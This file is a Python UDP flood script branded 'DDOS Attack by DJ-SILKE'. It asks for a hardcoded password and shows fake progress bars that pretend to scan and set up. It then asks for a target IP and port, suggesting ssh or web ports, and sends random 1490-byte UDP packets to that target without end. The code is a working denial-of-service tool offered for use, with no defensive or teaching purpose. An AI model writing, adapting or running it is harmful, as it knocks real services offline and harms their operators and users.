
import os,time,socket,random,sys
from tqdm import tqdm
from time import sleep
from random import uniform

os.system("cls")

name ="admin"
password ="djsilke"

for i in range(900000000000000000000000):
	pwd = input("Enter the pass for " + name + " : " )
	j=1
	if(pwd==password):
    	
		break
    	
	else:

		continue

os.system("cls")

print("\u001b[1m\u001b[32mScan Network")

print("")
for i in tqdm(range(100)):
    sleep(uniform(.0, 0.1))
    
    

print("\u001b[37m ")
os.system("cls")


print("\u001b[1m\u001b[32mSeting up")
for i in tqdm(range(200)):
    sleep(uniform(.0, 0.1))

os.system("cls")

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
packet = random._urandom(1490)
print("\u001b[37m")
print("Starting up.")
os.system("cls")
print("Starting up..")
os.system("cls")
print("Starting up...")
os.system("cls")
print("Starting up DONE!")
os.system("cls")
print("--------------------------------------")
print("\u001b[1m\u001b[32m|     DDOS Attack by DJ-SILKE        |\u001b[34m")
print("| if you want to exit press Ctrl + c |\u001b[33m")
print("https://my-website-2584.jimdosite.com/")
print("\u001b[37m--------------------------------------")
print(" \u001b[1mPlease enter the \u001b[31mPORT \u001b[37mand \u001b[31mIP \u001b[37mbelow \u001b[37m")
print(" TIP: port 22 for \u001b[31mssh, port 80 for \u001b[31mweb \u001b[37m")

print("")

port = int(input("Port: "))
while True:
        a = input('ip scanner?  (yes/no) ')
        if a=="no" :
           break
        elif a=="yes":
            print("")
            print("copy the ip and run again!")
            print("\u001b[1m use Ctrl + c to exit")
            os.system("echo off")
            os.system("netstat")
            time.sleep(secs=10)
            break
              
ipp = input("IP Address:  ")
sent = 0
print("\u001b[37m ")





while True:
    s.sendto(packet,(ipp,port))
    sent += 1
    print("DDos Attack {} port - {} ip - {} sending" .format(port,ipp,sent))